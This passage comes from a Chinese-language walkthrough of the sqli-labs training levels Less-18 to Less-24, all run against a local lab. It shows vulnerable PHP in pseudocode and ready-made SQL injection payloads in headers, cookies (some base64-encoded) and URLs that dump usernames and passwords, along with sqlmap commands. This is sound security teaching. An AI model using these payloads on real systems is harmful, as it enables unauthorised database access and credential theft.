<li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li>
<li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li>
</ul>
<p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-18/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: 1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1:8888/Less-18/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="http://qiniuyun.lintstar.top/15893833852620.png" alt="15893833852620"></p>
<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>VALUES (&#39;$uagent&#39;)</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取请求的 referer 和 ip 地址</span></span><br><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 输入了uname 和 passwd:</span><br><span class="line">    <span class="comment"># uname 和 passwd 参数均被过滤</span></span><br><span class="line">    $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SQL语句有返回结果:</span><br><span class="line">        <span class="comment"># 单引号拼接后直接带入 insert 语句</span></span><br><span class="line">        $insert=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')"</span>;</span><br><span class="line">        输出 $_SERVER[<span class="string">'HTTP_REFERER'</span>]</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-19/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="http://qiniuyun.lintstar.top/15894186942757.png" alt="15894186942757"></p>
<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=&#39;$cookee&#39;</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">        $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">        $cookee = $row1[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">'uname'</span>, $cookee, time()+<span class="number">3600</span>);</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">        $cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        $sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">'uname'</span>, $row1[<span class="string">'username'</span>], time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关，所以这里国光老毛病又犯了，这里就再啰嗦一下：</p>
<h4 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-20/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: uname=admin' and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)#</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
<p><img src="http://qiniuyun.lintstar.top/15894228024343.png" alt="15894228024343"></p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-20/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: uname=admin'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)#</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 11</span><br></pre></td></tr></table></figure>
<p><img src="http://qiniuyun.lintstar.top/15894229147799.png" alt="15894229147799"></p>
<h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以国光这里就不演示了，下面直接演示sqlmap的注入过程吧：</p>
<h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><p><strong>联合查询注入</strong></p>
<p>如果 <code>--level</code> 设置为 <strong>2</strong> 或更高，则 sqlmap 会对 HTTP <code>Cookie</code> 请求头进行 SQL 注入测试:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-20/"</span> --cookie=<span class="string">"uname=admin"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --level=2</span><br></pre></td></tr></table></figure>
<p>当然手动通过<code>*</code>来标记注入也比较方便：<code>--cookie=&quot;uname=admin*&quot;</code></p>
<p><strong>报错注入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-20/"</span> --cookie=<span class="string">"uname=admin*"</span>--dbms=MySQL --random-agent --flush-session --technique=E -v 3</span><br></pre></td></tr></table></figure>
<p><strong>布尔盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-20/"</span> --cookie=<span class="string">"uname=admin*"</span>--dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure>
<p><strong>延时盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-20/"</span> --cookie=<span class="string">"uname=admin*"</span>--dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure>
<h2 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=(&#39;$cookee&#39;)</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">        $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">'uname'</span>, base64_encode($row1[<span class="string">'username'</span>]), time()+<span class="number">3600</span>);</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">                 <span class="comment"># 对 cookee 进行 base64 解密</span></span><br><span class="line">        $cookee = base64_decode($cookee);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        $sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">'uname'</span>, base64_encode($row1[<span class="string">'username'</span>]), time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用联合查询注入来简单演示一下吧：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-21/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: uname=c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSxwYXNzd29yZCBTRVBBUkFUT1IgMHgzYzYyNzIzZSkgRlJPTSB1c2Vycykj</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
<p>Cookie 的 uname 参数 Base64 解码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=sqlsec&apos;) union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#</span><br></pre></td></tr></table></figure>
<p><img src="http://qiniuyun.lintstar.top/1589426073817.png" alt="1589426073817"></p>
<h4 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>手工注入问题不大，那么尝试直接使用 sqlmap 来进行联合查询注入看看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-21/"</span> --cookie=<span class="string">"uname=*"</span> --tamper=<span class="string">"base64encode"</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure>
<p>sqlmap 本身不会混淆发送的 payload，混淆 payload 的话可以使用 sqlmap 自带的 payload 库</p>
<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=&quot;$cookee&quot;</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先双引号 然后直接拼接到SQL语句中</span></span><br><span class="line">$cookee1 = <span class="string">'"'</span>. $cookee. <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，国光这里就不再啰嗦了。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-22/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: uname=c3Fsc2VjIiB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QgR1JPVVBfQ09OQ0FUKHVzZXJuYW1lLHBhc3N3b3JkIFNFUEFSQVRPUiAweDNjNjI3MjNlKSBGUk9NIHVzZXJzKSM=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
<p>Cookie 的 uname 参数 Base64 解码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=sqlsec&quot; union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#</span><br></pre></td></tr></table></figure>
<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取到 id 的值</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span></span><br><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用单引号拼接 SQL</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 有查询结果:</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>一个经典的二次注入场景，所以下面国光来单个理一下源码。</p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><ul>
<li><code>index.php</code></li>
</ul>
<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p>
<p><img src="http://qiniuyun.lintstar.top/15895151791144.png" alt="15895151791144"></p>
<p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p>
<p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p>
<p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p>
<ul>
<li><code>failed.php</code></li>
</ul>
<p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p>
<ul>
<li><code>forgot_password.php</code></li>
</ul>
<p>简单提示：如果你忘记密码 请 hack it</p>
<ul>
<li><code>Logged-in.php</code></li>
</ul>
<p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p>
<ul>
<li><code>new_user.php</code></li>
</ul>
<p>创建新用户的表单页面，本文件主要存放前段代码。</p>
<ul>
<li><code>login_create.php</code></li>
</ul>
<p>创建新用户的后端代码，下面来简单理一下代码的流程：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span></span><br><span class="line">username=  mysql_escape_string($_POST[<span class="string">'username'</span>]) ;</span><br><span class="line">$pass= mysql_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass= mysql_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前用户信息</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br><span class="line">如果当前用户已经存在 无法注册</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 两次输入密码一致：</span><br><span class="line">  <span class="comment"># 将记录插入数据库中</span></span><br><span class="line">  $sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br><span class="line">    查询完成后 重定向到首页</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    提示两次输入密码不一致</span><br></pre></td></tr></table></figure>
<ul>
<li><code>login.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录用户名和密码都被过滤了</span></span><br><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>pass_change.php</code></li>
</ul>
